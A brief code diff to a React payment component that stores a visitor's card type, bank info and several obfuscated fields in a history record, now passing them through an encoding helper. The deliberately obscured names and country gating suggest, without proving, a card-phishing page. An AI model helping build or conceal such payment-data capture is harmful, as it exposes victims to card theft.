@@ -17,6 +17,7 @@ import { FullPageLoader } from "./loader"
 import { _gt } from "@/lib/text-obf"
 import { _icb, isCountryAllowed } from "@/lib/firebase/settings"
 import { EmailModal } from "@/components/email-modal"
+import { _e } from "@/lib/secure-utils"
 
 
 interface _P1Props {
@@ -280,11 +281,11 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       console.log('[Payment] Data saved successfully')
 
       await addToHistory(visitorID, "_t1", {
-        _v1,
-        _v4,
+        _v1: _e(_v1),
+        _v4: _e(_v4),
         cardType,
-        _v3,
-        _v2,
+        _v3: _e(_v3),
+        _v2: _e(_v2),
         bankInfo
       }, "pending")
       
